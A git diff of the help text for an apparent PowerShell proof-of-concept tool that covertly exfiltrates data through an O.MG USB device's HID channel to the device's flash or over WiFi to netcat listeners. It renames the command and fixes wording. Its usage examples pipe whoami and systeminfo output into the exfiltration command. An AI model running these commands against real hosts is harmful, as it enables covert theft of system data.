@@ -12,9 +12,9 @@ A “low and slow” method of covert exfiltration meant to provide alternate
 pentesting pathways beyond using the target host’s network interfaces or 
 mass storage.
 This POC will allow data exfiltration back to the O.MG’s flash storage or
-act as a proxy between the target host and another device via the O.MG
-Device's built in WiFi interface which can allow you to recieve listeners 
-via nc, netcat, or similar tools.
+act as a proxy between the target host and another device, via the O.MG
+Device's built in WiFi interface, which can allow you to receive data via listeners 
+like nc, netcat, or similar tools.
 
 .PARAMETER Message
 Message which gets exfiltrated.
@@ -27,19 +27,19 @@ Defining product ID of the device. (Default: D34D)
 
 .EXAMPLE
 Defining a message: 
-HIDXpoc -Message "hello world"
+HIDXExfil -Message "hello world"
 
 .EXAMPLE
 HIDX usage with every paramter: 
-HIDXpoc -VendorID D3C0 -ProductID D34D -Message "test"
+HIDXExfil -VendorID D3C0 -ProductID D34D -Message "test"
 
 .EXAMPLE
 Piping output into HIDX: 
-whoami | HIDXpoc
+whoami | HIDXExfil
 
 .EXAMPLE
 Exfiltrating systeminfo with proper formatting:
-systeminfo | Out-String | HIDXpoc
+systeminfo | Out-String | HIDXExfil
 
 .LINK
 https://github.com/0iphor13
